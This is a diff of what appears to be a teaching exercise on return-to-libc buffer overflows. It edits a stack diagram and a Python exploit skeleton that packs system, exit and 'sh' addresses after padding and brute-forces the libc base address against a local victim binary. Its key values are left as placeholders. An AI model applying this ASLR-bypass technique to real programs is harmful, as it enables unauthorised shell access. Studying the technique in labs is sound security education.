@@ -14,7 +14,7 @@ Address    |  |                 |
            |  |                 |
            |  +-----------------+
            |  |                 |
-           |  |   "/bin/sh"     |
+           |  |   "sh"          |
  Bigger    |  |   address       |
  Address   v  +-----------------+
 
@@ -23,15 +23,32 @@ Address    |  |                 |
 from struct import pack
 from subprocess import call
 
-a_size = 1984
-# system = ?
-# exit = ?
-# binsh = ?
-# pointer_fmt = ?
+EXPERIMENTS = 256
 
-buf = 'A' * a_size
-# buf += pack(pointer_fmt, system)
-# buf += pack(pointer_fmt, exit)
-# buf += pack(pointer_fmt, binsh)
+'''
+mid = ?
+libc_base = ?
+exit_offset = ?
+system_offset = ?
+sh_addr = ?
+a_size = ?
+pointer_fmt = ?
 
-call(["./victim_r2p", buf])
+
+buf = "A" * a_size
+buf += pack(pointer_fmt, libc_base + mid + system_offset)
+buf += pack(pointer_fmt, libc_base + mid + exit_offset)
+buf += pack(pointer_fmt, sh_addr)
+
+# let's bet for EXPERIMENTS times
+# that the base address of libc is libc_base + mid
+i = 0
+while (i < EXPERIMENTS):
+    print "[EXPERIMENT] Round %d" % (i + 1)
+    i += 1
+    ret = call(["./victim_bf", buf])
+    if (not ret):
+        break
+    else:
+        print "[EXPERIMENT] Fail"
+```
